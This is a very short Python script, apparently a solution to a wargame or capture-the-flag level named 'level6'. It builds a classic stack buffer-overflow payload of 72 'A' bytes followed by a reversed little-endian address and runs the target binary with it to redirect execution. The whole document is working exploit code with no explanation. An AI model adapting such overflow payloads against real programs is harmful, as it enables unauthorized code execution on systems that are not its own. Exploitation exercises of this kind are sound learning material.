#!/usr/bin/python

import os

nAddr = "\x08\x04\x84\x54"[::-1]
arg = 72*"A" + nAddr
cmd = "/home/user/level6/level6 " + arg
print(arg)
os.system(cmd)
